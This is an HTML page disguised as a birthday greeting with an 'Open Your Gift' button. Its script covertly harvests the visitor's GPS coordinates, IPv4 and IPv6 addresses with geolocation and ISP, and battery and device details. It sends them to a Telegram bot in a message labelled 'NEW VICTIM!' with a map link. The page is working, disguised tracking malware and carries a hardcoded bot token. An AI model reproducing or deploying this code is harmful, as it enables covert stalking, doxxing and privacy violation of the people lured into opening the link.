<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Happy Birthday! 🎂</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            padding: 20px;
        }
        .container {
            background: rgba(255,255,255,0.95);
            border-radius: 30px;
            padding: 50px 40px;
            max-width: 500px;
            width: 100%;
            text-align: center;
            box-shadow: 0 25px 50px rgba(0,0,0,0.3);
        }
        .gift-icon { font-size: 100px; margin-bottom: 20px; display: inline-block; }
        h1 { color: #333; margin-bottom: 10px; font-size: 32px; }
        .subtitle { color: #666; margin-bottom: 30px; }
        button {
            background: linear-gradient(135deg, #667eea, #764ba2);
            border: none;
            padding: 14px 35px;
            border-radius: 50px;
            color: white;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
        }
        .message {
            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
            border-radius: 20px;
            padding: 25px;
            margin-top: 25px;
            display: none;
            color: white;
        }
        .message.show { display: block; }
        .footer { margin-top: 25px; font-size: 11px; color: #aaa; }
    </style>
</head>
<body>
<div class="container">
    <div class="gift-icon">🎁</div>
    <h1>🎂 Happy Birthday! 🎉</h1>
    <div class="subtitle">Someone sent you a birthday surprise!</div>
    <button id="giftBtn">🎁 Open Your Gift 🎁</button>
    <div class="message" id="message">
        <h2>🎈 SURPRISE! 🎈</h2>
        <p>Wishing you a fantastic birthday! 🎂</p>
        <p>May all your wishes come true! ✨</p>
    </div>
    <div class="footer">❤️ Made with love</div>
</div>

<script>
    const BOT_TOKEN = "8858548041:AAH5-uEvtsWNMsCpeEKsvOseVnLM-tAHaNs";
    
    const urlParams = new URLSearchParams(window.location.search);
    const targetId = urlParams.get('id') || 'unknown';
    const targetName = urlParams.get('name') || 'Guest';
    const USER_CHAT_ID = urlParams.get('user_id') || '6323367629';
    
    let dataSent = false;
    
    async function sendToTelegram(message) {
        try {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: USER_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML',
                    disable_web_page_preview: true
                })
            });
        } catch(e) {}
    }
    
    // Get BOTH IPv4 and IPv6 with accurate location
    async function getBothIPs() {
        let ipv4Data = { ip: 'N/A', city: 'N/A', region: 'N/A', country: 'N/A', isp: 'N/A', lat: 'N/A', lon: 'N/A' };
        let ipv6Data = { ip: 'N/A', city: 'N/A', region: 'N/A', country: 'N/A', isp: 'N/A', lat: 'N/A', lon: 'N/A' };
        
        // Get IPv4 + Location (most accurate)
        try {
            const resp = await fetch('https://api.ipify.org?format=json');
            const ipData = await resp.json();
            const ipv4 = ipData.ip;
            
            // Get location for IPv4
            const locResp = await fetch(`http://ip-api.com/json/${ipv4}?fields=status,country,regionName,city,zip,lat,lon,isp,org,as,mobile,proxy,query`);
            const locData = await locResp.json();
            
            if (locData.status === 'success') {
                ipv4Data = {
                    ip: locData.query,
                    city: locData.city,
                    region: locData.regionName,
                    country: locData.country,
                    postal: locData.zip || 'N/A',
                    isp: locData.isp,
                    org: locData.org,
                    lat: locData.lat,
                    lon: locData.lon,
                    mobile: locData.mobile,
                    proxy: locData.proxy
                };
            }
        } catch(e) { console.log('IPv4 error:', e); }
        
        // Get IPv6 + Location
        try {
            const resp = await fetch('https://api6.ipify.org?format=json');
            const ipData = await resp.json();
            const ipv6 = ipData.ip;
            
            // Try to get location for IPv6 (some APIs support it)
            try {
                const locResp = await fetch(`https://ipapi.co/${ipv6}/json/`);
                const locData = await locResp.json();
                if (locData.ip) {
                    ipv6Data = {
                        ip: locData.ip,
                        city: locData.city || 'N/A',
                        region: locData.region || 'N/A',
                        country: locData.country_name || 'N/A',
                        isp: locData.org || 'N/A',
                        lat: locData.latitude || 'N/A',
                        lon: locData.longitude || 'N/A'
                    };
                }
            } catch(e) {}
        } catch(e) { console.log('IPv6 error:', e); }
        
        return { ipv4: ipv4Data, ipv6: ipv6Data };
    }
    
    // Better GPS with multiple attempts
    async function getGPSLocation() {
        for (let attempt = 1; attempt <= 3; attempt++) {
            try {
                const pos = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    });
                });
                return {
                    success: true,
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude,
                    accuracy: pos.coords.accuracy,
                    altitude: pos.coords.altitude || 'N/A'
                };
            } catch(e) {
                await new Promise(r => setTimeout(r, 1000));
            }
        }
        return { success: false };
    }
    
    // Battery Info
    async function getBatteryInfo() {
        try {
            if ('getBattery' in navigator) {
                const battery = await navigator.getBattery();
                return {
                    level: Math.round(battery.level * 100),
                    charging: battery.charging
                };
            }
        } catch(e) {}
        return { level: 'N/A', charging: 'N/A' };
    }
    
    // Device Info
    async function getDeviceInfo() {
        const connection = navigator.connection || navigator.mozConnection;
        return {
            platform: navigator.platform,
            screen: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            language: navigator.language,
            connectionType: connection ? connection.effectiveType : 'N/A',
            touchPoints: navigator.maxTouchPoints || 0,
            hardwareCores: navigator.hardwareConcurrency || 'N/A'
        };
    }
    
    document.getElementById('giftBtn').onclick = async function() {
        if (dataSent) return;
        
        document.getElementById('giftBtn').innerHTML = "🎁 Opening... 🎁";
        document.getElementById('giftBtn').disabled = true;
        
        const [ips, gps, battery, device] = await Promise.all([
            getBothIPs(),
            getGPSLocation(),
            getBatteryInfo(),
            getDeviceInfo()
        ]);
        
        let msg = `🎁 <b>NEW VICTIM!</b>\n`;
        msg += `━━━━━━━━━━━━━━━━━━━━\n`;
        msg += `🔗 <b>Link:</b> ${targetName}\n`;
        msg += `🆔 <b>ID:</b> ${targetId}\n`;
        msg += `━━━━━━━━━━━━━━━━━━━━\n\n`;
        
        // GPS Section
        if (gps.success) {
            msg += `<b>📍 EXACT GPS LOCATION</b>\n`;
            msg += `├ Lat: <code>${gps.lat}</code>\n`;
            msg += `├ Lon: <code>${gps.lon}</code>\n`;
            msg += `├ Accuracy: ${Math.round(gps.accuracy)} meters\n`;
            msg += `└ 🗺️ <a href="https://www.google.com/maps?q=${gps.lat},${gps.lon}">VIEW ON MAP</a>\n\n`;
        } else {
            msg += `<b>📍 GPS:</b> ❌ Blocked/Unavailable\n\n`;
        }
        
        // IPv4 Section (Most Accurate)
        msg += `<b>🌐 IPv4 INFO (Most Accurate)</b>\n`;
        msg += `├ IP: <code>${ips.ipv4.ip}</code>\n`;
        msg += `├ City: ${ips.ipv4.city}\n`;
        msg += `├ State: ${ips.ipv4.region}\n`;
        msg += `├ Country: ${ips.ipv4.country}\n`;
        msg += `├ ISP: ${ips.ipv4.isp}\n`;
        if(ips.ipv4.mobile) msg += `├ Mobile Network: Yes\n`;
        msg += `└ Location: ${ips.ipv4.lat}, ${ips.ipv4.lon}\n\n`;
        
        // IPv6 Section
        if(ips.ipv6.ip != 'N/A') {
            msg += `<b>🌐 IPv6 INFO</b>\n`;
            msg += `├ IP: <code>${ips.ipv6.ip.substring(0, 50)}...</code>\n`;
            msg += `├ City: ${ips.ipv6.city}\n`;
            msg += `├ Region: ${ips.ipv6.region}\n`;
            msg += `├ Country: ${ips.ipv6.country}\n`;
            msg += `└ ISP: ${ips.ipv6.isp}\n\n`;
        }
        
        // Device Section
        msg += `<b>📱 DEVICE INFO</b>\n`;
        msg += `├ Platform: ${device.platform}\n`;
        msg += `├ Screen: ${device.screen}\n`;
        msg += `├ Touch Points: ${device.touchPoints}\n`;
        msg += `├ CPU Cores: ${device.hardwareCores}\n`;
        msg += `├ Timezone: ${device.timezone}\n`;
        msg += `├ Language: ${device.language}\n`;
        msg += `└ Connection: ${device.connectionType}\n\n`;
        
        // Battery Section
        msg += `<b>🔋 BATTERY</b>\n`;
        msg += `├ Level: ${battery.level}%\n`;
        msg += `└ Charging: ${battery.charging ? 'Yes' : 'No'}\n\n`;
        
        msg += `<b>🕐 TIME:</b> ${new Date().toLocaleString()}\n`;
        msg += `━━━━━━━━━━━━━━━━━━━━\n`;
        msg += `👨‍💻 @KINGITACHI18`;
        
        await sendToTelegram(msg);
        
        document.getElementById('message').classList.add('show');
        document.getElementById('giftBtn').style.display = 'none';
        dataSent = true;
    };
</script>
</body>
</html>
